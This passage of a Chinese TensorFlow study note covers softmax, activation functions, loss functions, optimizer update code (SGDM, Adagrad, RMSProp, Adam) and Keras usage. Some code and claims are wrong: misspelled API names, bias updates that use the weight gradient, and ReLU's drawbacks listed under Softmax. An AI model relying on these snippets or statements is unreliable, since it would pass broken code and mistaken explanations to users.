class="hljs-comment"># eg</span><br><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br>classes = <span class="hljs-number">2</span><br>labels = tf.constant([<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>])  <span class="hljs-comment"># 输入的元素值最小为0，最大为2</span><br>output = tf.one_hot(labels, depth=classes)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;result of labels1:&quot;</span>, output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment"># 输出</span><br>result of labels1: tf.Tensor(<br>[[<span class="hljs-number">0.</span> <span class="hljs-number">1.</span>]<br> [<span class="hljs-number">1.</span> <span class="hljs-number">0.</span>]<br> [<span class="hljs-number">0.</span> <span class="hljs-number">0.</span>]], shape=(<span class="hljs-number">3</span>, <span class="hljs-number">2</span>), dtype=float32)<br></code></pre></td></tr></table></figure><h4 id="概率统计">概率统计</h4><p>对于分类问题，神经网络完成前向传播，计算出了每种类型的可能性大小，需要输出符合了概率分布时，才可以与独热码的标签作比较<br>$$<br>Softmax(y_i)=\frac{e^{y_i}}{\sum ^n_{j=0}e^{y_i}}<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使输出符合概率分布</span><br>tf.nn.softmax(x)<br><span class="hljs-comment"># eg</span><br>y = tf.constant([<span class="hljs-number">1.01</span>,<span class="hljs-number">2.01</span>,-<span class="hljs-number">0.66</span>])<br>y_pro = tf.nn.softmax(y)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;After softmax,y_pro is:&quot;</span>,y_pro)<br><span class="hljs-comment"># 输出</span><br>After softmax,y_pro <span class="hljs-keyword">is</span>:tf.Tensor([<span class="hljs-number">0.25598174</span> <span class="hljs-number">0.69583046</span> <span class="hljs-number">0.0481878</span>],shape=(<span class="hljs-number">3</span>,),dtype=float32)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/16/8u6CksHqv1FtJ79.png" alt=""></p><p>一般情况下我们将神经网络正向传播后的结果组成张量然后使用该函数对其进行统计概率分布，对于高维我们还可以使用 squeeze 去除大小为 1 的维度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># &#x27;t&#x27; = [1, 2, 1, 3, 1, 1]</span><br>tf.shape(tf.squeeze(t))  <span class="hljs-comment"># [2, 3]</span><br></code></pre></td></tr></table></figure><p>或者,要删除特定的大小为1的维度：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># &#x27;t&#x27; = [1, 2, 1, 3, 1, 1]</span><br>tf.shape(tf.squeeze(t, [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>]))  <span class="hljs-comment"># [1, 2, 3, 1]</span><br></code></pre></td></tr></table></figure><h4 id="参数自更新">参数自更新</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 赋值操作，更新参数的值并返回</span><br><span class="hljs-comment"># 调用assign_sub前，先用 tf.Variable定义变量w为可训练（可自更新）</span><br>w.assign_sub(w要自减的内容)<br><span class="hljs-comment"># eg</span><br>w = tf.Variable(<span class="hljs-number">4</span>)<br>w.assign_sub(<span class="hljs-number">1</span>) <span class="hljs-comment"># w = w - 1 </span><br><span class="hljs-built_in">print</span>(w)<br><span class="hljs-comment"># 输出</span><br>&lt;tf.Variable <span class="hljs-string">&#x27;Variable:0&#x27;</span> shape=() dtype=int32, numpy=<span class="hljs-number">3</span>&gt;<br></code></pre></td></tr></table></figure><h4 id="条件判别">条件判别</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 条件语句真返回 A，条件语句假返回 B</span><br>tf.where(条件语句,真返回A,假返回B)<br><span class="hljs-comment"># eg</span><br><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><br>a = tf.constant([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>])<br>b = tf.constant([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br>c = tf.where(tf.greater(a, b), a, b)  <span class="hljs-comment"># 若a&gt;b，返回a对应位置的元素，否则返回b对应位置的元素</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c:&quot;</span>, c)<br><span class="hljs-comment"># 输出</span><br>c:tf.Tensor([<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>], shape=(<span class="hljs-number">5</span>,), dtype=int32)<br></code></pre></td></tr></table></figure><h4 id="垂直叠加">垂直叠加</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将两个数组按垂直方向叠加</span><br>np.vstack((数组<span class="hljs-number">1</span>,数组<span class="hljs-number">2</span>)) <span class="hljs-comment"># numpy 中的方法</span><br></code></pre></td></tr></table></figure><h4 id="网格坐标点生成">网格坐标点生成</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 生成等间隔数值点 [起始值,结束值)</span><br>np.mgrid[起始值:结束值:步长,起始值:结束值:步长,...]<br><span class="hljs-comment"># 将 x 变为一位数组，即把 . 前变量拉直</span><br>x.ravel()<br><span class="hljs-comment"># 使返回的间隔数值点配对</span><br>np.c_[数组<span class="hljs-number">1</span>,数组<span class="hljs-number">2</span>,...]<br><span class="hljs-comment"># 通常上述三个方法一起使用</span><br></code></pre></td></tr></table></figure><h2 id="神经网络-NN-复杂度">神经网络(NN)复杂度</h2><p><img src="https://s2.loli.net/2023/01/17/47SmovxDgFLbifd.png" alt=""></p><p>我们对于神经网络的复杂度统计只统计具有运算能力的层，同时在输入层和输出层中间的所有层都称之为隐藏层</p><h2 id="学习率">学习率</h2><h3 id="指数衰减学习率">指数衰减学习率</h3><p>可以先用较大的学习率，快速得到最优解，然后逐步减小学习率，使模型在训练后期稳定<br>$$<br>指数衰减学习率 = 初始学习率*学习率衰减率^{\frac{当前轮数}{多少轮衰减一次}}<br>$$</p><blockquote><p>初始学习率 与 学习衰减率 与 多少轮衰减一次 为超参数</p></blockquote><h2 id="激活函数">激活函数</h2><h3 id="Sigmoid-函数">Sigmoid 函数</h3><p>Sigmoid函数也叫Logistic函数，用于隐层神经元输出，取值范围为(0,1)，它可以将一个实数映射到(0,1)的区间，可以用来做二分类。在特征相差比较复杂或是相差不是特别大时效果比较好。sigmoid是一个十分常见的激活函数，函数的表达式如下：<br>$$<br>f(x)=\frac{1}{1+e^{-x}}<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.nn.sigmoid(x)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/jcmCBlfDOtUkbT7.png" alt=""></p><h4 id="在什么情况下适合使用-Sigmoid-激活函数呢？">在什么情况下适合使用 Sigmoid 激活函数呢？</h4><ul><li>Sigmoid 函数的输出范围是 0 到 1。由于输出值限定在 0 到1，因此它对每个神经元的输出进行了归一化；</li><li>用于将预测概率作为输出的模型。由于概率的取值范围是 0 到 1，因此 Sigmoid 函数非常合适；</li><li>梯度平滑，避免「跳跃」的输出值；</li><li>函数是可微的。这意味着可以找到任意两个点的 sigmoid 曲线的斜率；</li><li>明确的预测，即非常接近 1 或 0。</li></ul><h4 id="Sigmoid-激活函数存在的不足：">Sigmoid 激活函数存在的不足：</h4><ul><li><strong>梯度消失</strong>：注意：Sigmoid 函数趋近 0 和 1 的时候变化率会变得平坦，也就是说，Sigmoid 的梯度趋近于 0。神经网络使用 Sigmoid 激活函数进行反向传播时，输出接近 0 或 1 的神经元其梯度趋近于 0。这些神经元叫作饱和神经元。因此，这些神经元的权重不会更新。此外，与此类神经元相连的神经元的权重也更新得很慢。该问题叫作梯度消失。因此，想象一下，如果一个大型神经网络包含 Sigmoid 神经元，而其中很多个都处于饱和状态，那么该网络无法执行反向传播。</li><li><strong>不以零为中心</strong>：Sigmoid 输出不以零为中心的,，输出恒大于0，非零中心化的输出会使得其后一层的神经元的输入发生偏置偏移（Bias Shift），并进一步使得梯度下降的收敛速度变慢。</li><li><strong>计算成本高昂</strong>：exp() 函数与其他非线性激活函数相比，计算成本高昂，计算机运行起来速度较慢。</li></ul><h3 id="Tanh-函数">Tanh 函数</h3><p>Tanh 激活函数又叫作双曲正切激活函数（hyperbolic tangent activation function）。与 Sigmoid 函数类似，Tanh 函数也使用真值，但 Tanh 函数将其压缩至-1 到 1 的区间内。与 Sigmoid 不同，Tanh 函数的输出以零为中心，因为区间在-1 到 1 之间。</p><p>函数表达式：<br>$$<br>f(x)=\frac{1-e^{-2x}}{1+e^{-2x}}<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.math.tanh(x)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/XOkYnq9lHR5cMj2.png" alt=""></p><p>在实践中，Tanh 函数的使用优先性高于 Sigmoid 函数。负数输入被当作负值，零输入值的映射接近零，正数输入被当作正值：</p><ul><li>当输入较大或较小时，输出几乎是平滑的并且梯度较小，这不利于权重更新。二者的区别在于输出间隔，tanh 的输出间隔为 1，并且整个函数以 0 为中心，比 sigmoid 函数更好；</li><li>在 tanh 图中，负输入将被强映射为负，而零输入被映射为接近零。</li></ul><h3 id="Relu-函数">Relu 函数</h3><p>ReLU函数又称为修正线性单元（Rectified Linear Unit），是一种分段线性函数，其弥补了sigmoid函数以及tanh函数的梯度消失问题，在目前的深度神经网络中被广泛使用。ReLU函数本质上是一个斜坡（ramp）函数，公式及函数图像如下：<br>$$<br>f(x)=max(x,0)\\ \ \ \ \ \ \ \ \ \ \ \ \ =\begin{cases} 0\ \ \ \ \  x&lt;0 \x\ \ \ \ \ x&gt;=0 \end{cases}<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.nn.relu(x)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/RbhA2iY4pDC1Z9F.png" alt=""></p><h3 id="Leaky-Relu-函数">Leaky Relu 函数</h3><p>为了解决 ReLU 激活函数中的梯度消失问题，当 x &lt; 0 时，我们使用 Leaky ReLU —— 该函数试图修复 dead ReLU 问题。</p><p>函数表达式以及图像如下：<br>$$<br>f(x)=max(ax,x)<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.nn.leaky_relu(x)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/17/BbarcHQwtZVSFGU.png" alt=""></p><h3 id="softmax">softmax</h3><p>Softmax 是用于多类分类问题的激活函数，在多类分类问题中，超过两个类标签则需要类成员关系。对于长度为 K 的任意实向量，Softmax 可以将其压缩为长度为 K，值在（0，1）范围内，并且向量中元素的总和为 1 的实向量。</p><p>函数表达式如下：<br>$$<br>S_i=\frac{e^i}{\sum_je^j}<br>$$</p><h4 id="Softmax-激活函数的不足：">Softmax 激活函数的不足：</h4><ul><li>在零点不可微；</li><li>负输入的梯度为零，这意味着对于该区域的激活，权重不会在反向传播期间更新，因此会产生永不激活的死亡神经元。</li></ul><h3 id="一些建议-——-对于初学者">一些建议 —— 对于初学者</h3><ol><li>首选relu激活函数</li><li>学习率设置较小值</li><li>输入特征标准化，即让输入特征满足以 0 为均值，1 为标准差的正态分布</li><li>初始参数中心化，即让随机生成的参数满足以 0 为均值，$\sqrt{\frac{2}{当前层输入特征个数}}$为标准差的正态分布</li></ol><h2 id="损失函数">损失函数</h2><p>损失函数(loss)：预测值(y)与已知答案(y_)的差距</p><p>NN优化目标 -&gt; loss 最小</p><h3 id="mse-损失函数">mse 损失函数</h3><p>$$<br>MSE(y,y_)=\frac{\sum_{k=0}^{n}(y-y_)^2} n<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">loss_mse = tf.reduce_mean(tf.square(y-y_))<br></code></pre></td></tr></table></figure><h3 id="自定义损失函数">自定义损失函数</h3><p>$$<br>loss(y_,y)=\sum_n f(y_,y)<br>$$</p><blockquote><p>y_ : 标准答案数据集的 y : 预测答案计算出的</p></blockquote><p>即我们可以自己定义对应不同情况下的损失率，对于不同的情况下定义相应的 f(y_,y)</p><h3 id="交叉熵-CE">交叉熵 CE</h3><p>其表示两个概率分布之间的距离<br>$$<br>H(y_,y)=-\sum y*\ln y<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.losses.categorical_crosseentropy(y_,y)<br></code></pre></td></tr></table></figure><p>当交叉熵越小时，对应的预测更为准确</p><p>一般来说我们通常先将输出通过 softmax 转换为符合概率分布的结果，再计算 y 与 y_ 的交叉熵损失函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.nn.softmax_cross_entropy_with_logits(y,y_)<br><span class="hljs-comment"># 等价于下面两条语句</span><br>y_pro = tf.nn.softmax(y)<br>tf.losses.catgorical_crossentropy(y_,y_pro)<br></code></pre></td></tr></table></figure><h2 id="欠拟合与过拟合">欠拟合与过拟合</h2><p><img src="https://s2.loli.net/2023/01/17/ztWVb1SYs3XymJR.png" alt=""></p><p>对于欠拟合我们有如下解决方法：</p><ol><li><p>增加输入特征选项</p></li><li><p>增加网络参数</p></li><li><p>减少正则化参数</p></li></ol><p>对于过拟合我们有如下方法：</p><ol><li>数据清洗</li><li>增大训练集</li><li>采用正则化</li><li>增大正则化参数</li></ol><blockquote><p>正则化：在损失函数中引入模型复杂度指标，通过给 w 添加权值，而弱化训练数据的噪声 (一般不正则化 b)</p><p><img src="https://s2.loli.net/2023/01/17/zpyT1RG92W5qead.png" alt="image-20230117211145111"></p></blockquote><h2 id="参数优化器">参数优化器</h2><p>优化器是引导神经网络更新参数的工具</p><p>我们定义如下参数：待优化参数 w，损失函数 loss，学习率 Lr，每次迭代一个 batch，t 表示当前 batch 迭代的总次数</p><ol><li>计算 t 时刻损失函数关于当前参数的梯度 $g_t=\nabla loss = \frac {\partial loss}{\partial(w_t)}$</li><li>计算 t 时刻一阶动量$m_t$和二阶动量$V_t$</li><li>计算 t 时刻下降梯度$\eta_t =Lr *\frac{m_t}{\sqrt V_t}$</li><li>计算 t+1 时刻下降梯度$w_{t+1} =w_t-\eta_t=w_t-Lr *\frac{m_t}{\sqrt V_t}$</li></ol><blockquote><p>一阶动量：与梯度相关的函数</p><p>二阶动量：与梯度平方相关的函数</p><p>对于不同的优化器，实质上只是定义了不同的一阶动量和二阶动量公式</p></blockquote><h3 id="SGD-优化器">SGD 优化器</h3><p>SGD是最常用的随机梯度下降法，当不含动量时其定义了如下动量计算方式</p><p><img src="https://s2.loli.net/2023/01/18/7lGLsjBFgWC1EAK.png" alt=""></p><blockquote><p>$g_t$ ：对应的各时刻梯度值</p></blockquote><h3 id="SGDM-优化器">SGDM 优化器</h3><p>在 SGD 的基础上增加一阶动量</p><p><img src="https://s2.loli.net/2023/01/19/qN714Y95IsSPQWz.png" alt=""></p><blockquote><p>$m_t$ ： 表示各时刻梯度方向的指数滑动平均值</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 超参数设置</span><br>m_w, m_b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>beta = <span class="hljs-number">0.9</span> <span class="hljs-comment"># 经验值是 0.9</span><br><span class="hljs-comment"># sgd-momentun  </span><br>m_w = beta * m_w + (<span class="hljs-number">1</span>- beta) * grads[<span class="hljs-number">0</span>]<br>m_b = beta * m_b + (<span class="hljs-number">1</span>- beta) * grads[<span class="hljs-number">1</span>]<br>w1.assign_sub(lr * m_w)<br>b1.assigen_sub(lr * m_b)<br></code></pre></td></tr></table></figure><h3 id="Adagrad-优化器">Adagrad 优化器</h3><p>其在SGD的基础上增加二阶动量</p><p><img src="https://s2.loli.net/2023/01/19/TieC9ZPYDEfbw56.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 超参数设置</span><br>v_w, v_b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><span class="hljs-comment"># adagrad</span><br>v_w += tf.square(grads[<span class="hljs-number">0</span>])<br>v_b += tf.square(grads[<span class="hljs-number">1</span>])<br>w1.assign_sub(lr * grads[<span class="hljs-number">0</span>] / tf.sqrt(v_w))<br>b1.assign_sub(lr * grads[<span class="hljs-number">0</span>] / tf.sqrt(v_b))<br></code></pre></td></tr></table></figure><p>RMSProp 优化器</p><p>在SGD的基础上增加二阶动量</p><p><img src="https://s2.loli.net/2023/01/19/Wh9XjlTyrSBt54Q.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 超参数设置</span><br>v_w, v_b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>beta = <span class="hljs-number">0.9</span><br><span class="hljs-comment"># RMSProp</span><br>v_w = beta * v_w + (<span class="hljs-number">1</span>- beta) * tf.square(grads[<span class="hljs-number">0</span>])<br>v_b = beta * v_b + (<span class="hljs-number">1</span>- beta) * tf.square(grads[<span class="hljs-number">1</span>])<br>w1.assign_sub(lr * grads[<span class="hljs-number">0</span>] / tf.sqrt(v_w))<br>b1.assign_sub(lr * grads[<span class="hljs-number">0</span>] / tf.sqrt(v_b))<br></code></pre></td></tr></table></figure><h3 id="Adam-优化器">Adam 优化器</h3><p>同时结合了SGDM一阶动量和RMSProp二阶动量</p><p><img src="https://s2.loli.net/2023/01/19/nvL2x1hlWreouXp.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 超参数设置</span><br>m_w, m_b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>v_w, v_b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>beta1, beta2 = <span class="hljs-number">0.9</span>, <span class="hljs-number">0.999</span><br>delta_w, delta_b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>global_step = <span class="hljs-number">0</span><br><span class="hljs-comment"># 训练过程</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(epoch):  <span class="hljs-comment"># 数据集级别的循环，每个epoch循环一次数据集</span><br>    <span class="hljs-keyword">for</span> step, (x_train, y_train) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(train_db):  <span class="hljs-comment"># batch级别的循环 ，每个step循环一个batch</span><br>global_step += <span class="hljs-number">1</span><br>...<br><span class="hljs-comment"># Adam</span><br>m_w = beta1 * m_w + (<span class="hljs-number">1</span> - beta1) * grads[<span class="hljs-number">0</span>]<br>        m_b = beta1 * m_b + (<span class="hljs-number">1</span> - beta1) * grads[<span class="hljs-number">1</span>]<br>        v_w = beta2 * v_w + (<span class="hljs-number">1</span> - beta2) * tf.square(grads[<span class="hljs-number">0</span>])<br>        v_b = beta2 * v_b + (<span class="hljs-number">1</span> - beta2) * tf.square(grads[<span class="hljs-number">1</span>])<br><br>        m_w_correction = m_w / (<span class="hljs-number">1</span> - tf.<span class="hljs-built_in">pow</span>(beta1, <span class="hljs-built_in">int</span>(global_step)))<br>        m_b_correction = m_b / (<span class="hljs-number">1</span> - tf.<span class="hljs-built_in">pow</span>(beta1, <span class="hljs-built_in">int</span>(global_step)))<br>        v_w_correction = v_w / (<span class="hljs-number">1</span> - tf.<span class="hljs-built_in">pow</span>(beta2, <span class="hljs-built_in">int</span>(global_step)))<br>        v_b_correction = v_b / (<span class="hljs-number">1</span> - tf.<span class="hljs-built_in">pow</span>(beta2, <span class="hljs-built_in">int</span>(global_step)))<br><br>        w1.assign_sub(lr * m_w_correction / tf.sqrt(v_w_correction))<br>        b1.assign_sub(lr * m_b_correction / tf.sqrt(v_b_correction))<br></code></pre></td></tr></table></figure><h2 id="梯度下降">梯度下降</h2><h3 id="损失函数-2">损失函数</h3><p><img src="https://s2.loli.net/2023/01/15/2KHomxLuebwnaqR.png" alt=""><br>$$<br>MSE(y,y_)=\frac{\sum_{k=0}^{n}(y-y_)^2} n<br>$$<br>上述<code>特征x * w + b = y</code>的过程被称为正向传播，而我们的目的是找到一组参数w和b，使得损失函数最小</p><p><strong>梯度下降法</strong>:沿损失函数梯度下降的方向，寻找损失函数的最小值，得到最优参数的方法。</p><p><strong>学习率</strong>(Lr):当学习率设置的过小时，收敛过程将变得分缓慢。而当学习率设置的过大时，梯度可能会在最小值附近来回震荡,甚至可能无法收敛。</p><h3 id="梯度下降算法">梯度下降算法</h3><p>$$<br>W_{t+1} =W_t-Lr*\frac{\partial loss}{\partial W_t}<br>$$</p><p>$$<br>b_{t+1}=b-Lr*\frac{\partial loss}{\partial b_t}<br>$$</p><p>$$<br>W_{t+1}*x+b_{t+1}\rightarrow y<br>$$</p><p><strong>反向传播</strong>:从S后向前，逐层求损失函数对每层神经元参数的偏导数，迭代更新所有参数</p><p><img src="https://s2.loli.net/2023/01/15/Muc4NL2tvieE6sd.png" alt=""></p><h2 id="Keras-搭建神经网络">Keras 搭建神经网络</h2><p>Keras是tensorflow的一个模块，用于快速搭建神经网络</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br>model = tf.keras.models.Sequential([网络结构]) <span class="hljs-comment"># 描述各层网络</span><br><span class="hljs-comment"># 网络结构举例</span><br><span class="hljs-comment"># 拉直层</span><br>tf.keras.layers.Flatten()<br><span class="hljs-comment"># 全链接层</span><br>tf.keras.layers.Dense(神经元个数,activation=<span class="hljs-string">&quot;激活函数&quot;</span>,kernel_regularizer=正则化方式)<br><span class="hljs-comment"># activation可选: relu、softmax、sigmoid、tanh</span><br><span class="hljs-comment"># kernel_regularizer可选: tf.keras.regularizers.l1()、tf.keras.regularizers.l2()</span><br><span class="hljs-comment"># 卷积层</span><br>tf.keras.layers.Conv2D(filters=卷积核个数,kernel_size=卷积核尺寸,strides=卷积步长,padding=<span class="hljs-string">&quot;vaild&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;same&quot;</span>)<br><span class="hljs-comment"># LSTM层</span><br>tf.keras.layers.LSTM()<br></code></pre></td></tr></table></figure><h3 id="配置神经网络方法">配置神经网络方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">model.<span class="hljs-built_in">compile</span>(optimizer=优化器,loss=损失函数,metrics=[<span class="hljs-string">&quot;准确率&quot;</span>])<br><span class="hljs-comment"># 优化器可选项</span><br><span class="hljs-string">&#x27;sgd&#x27;</span> <span class="hljs-keyword">or</span> tf.keras.optimizers.SGD(lr=学习率,momentum=动量参数)<br><span class="hljs-string">&#x27;adagrad&#x27;</span> <span class="hljs-keyword">or</span> tf.keras.optimizers.Adagrad(lr=学习率)<br><span class="hljs-string">&#x27;adadelta&#x27;</span> <span class="hljs-keyword">or</span> tf.keras.optimizers.Adadelta(lr=学习率)<br><span class="hljs-string">&#x27;adam&#x27;</span> <span class="hljs-keyword">or</span> tf.keras.optimizers.Adam(lr=学习率,beta_1=<span class="hljs-number">0.9</span>,beta_2=<span class="hljs-number">0.999</span>)<br><span class="hljs-comment"># loss 可选项</span><br><span class="hljs-string">&#x27;mse&#x27;</span> <span class="hljs-keyword">or</span> tf.keras.losses.MeanSquaredError()<br><span class="hljs-string">&#x27;sparse_categorical_crossentropy&#x27;</span> <span class="hljs-keyword">or</span> tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="hljs-literal">False</span>) <span class="hljs-comment"># 设置损失函数时常用，from_logits参数用于询问是否使用原始输出，即没有经过概率分布的输出</span><br><span class="hljs-comment"># Metrics 可选项</span><br><span class="hljs-string">&#x27;accuracy&#x27;</span> : y_ 与 y 都是数值，如:y_=[<span class="hljs-number">1</span>],y=[<span class="hljs-number">1</span>]<br><span class="hljs-string">&#x27;categorical_accuracy&#x27;</span> : y_ 与 y 都是独热码(概率分布)，如:y_=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],y=[<span class="hljs-number">0.235</span>,<span class="hljs-number">0.648</span>,<span class="hljs-number">0.117</span>]<br><span class="hljs-string">&#x27;sparse_categorical_accuracy&#x27;</span> : y_是数值，y是独热码(概率分布)，如:y_=[<span class="hljs-number">1</span>],y=[<span class="hljs-number">0.235</span>,<span class="hljs-number">0.648</span>,<span class="hljs-number">0.117</span>]<br></code></pre></td></tr></table></figure><blockquote><p>初学建议直接使用字符串形式的参数，对于熟悉后可以查询相关文档后使用后者，修改相关的超参数</p></blockquote><h3 id="执行训练">执行训练</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">model.fit(训练集的输入特征,训练集的标签,<br>         batch_size= , epochs= ,<br>         validation_data=(测试机的输入特征,测试集的标签),<br>         validation_freq=多少次epoch测试一次)<br><span class="hljs-comment"># 或者</span><br>model.fit(训练集的输入特征,训练集的标签,<br>         batch_size= , epochs= ,<br>         validation_split=从训练集划分多少比例给测试集,<br>         validation_freq=多少次epoch测试一次)<br></code></pre></td></tr></table></figure><h3 id="网络参数和结构统计">网络参数和结构统计</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">model.summary()<br></code></pre></td></tr></table></figure><h3 id="自制数据集">自制数据集</h3><p>需要我们设计一共函数来将我们的数据集进行读入，对此我们可能需要创建对应的文件或者是对于对应的目录下的文件进行检测，对此我们需要导入 os，利用其内置库进行读写与判断,此处以读入图片进行训练为例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 